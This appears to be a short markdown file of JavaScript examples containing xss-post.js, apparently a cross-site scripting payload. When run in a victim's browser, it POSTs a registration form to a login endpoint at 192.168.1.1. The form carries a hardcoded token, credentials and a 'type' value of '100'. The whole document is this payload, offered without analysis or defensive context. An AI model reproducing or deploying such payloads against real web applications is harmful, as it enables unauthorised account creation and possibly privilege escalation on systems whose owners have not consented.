# Javascrip examples

**xss-post.js**:
```
async function submitRequest() {
  const data = new FormData();
  data.append('_token', 'ahj7AFQpyQvsbzG2anjdGfRput8465pLU1XPmQB3');
  data.append('username', 'uname');
  data.append('password', 'MyPass');
  data.append('firstName', 'fname');
  data.append('lastName', 'lname');
  data.append('email', 'uname@test.com');
  data.append('dType', 'isRegister');
  data.append('type', '100');

  const res = await fetch('http://192.168.1.1/loginLogout', {
    method: 'POST',
    body: data,
    redirect: 'manual'
  });

}

submitRequest().catch(console.error)

```
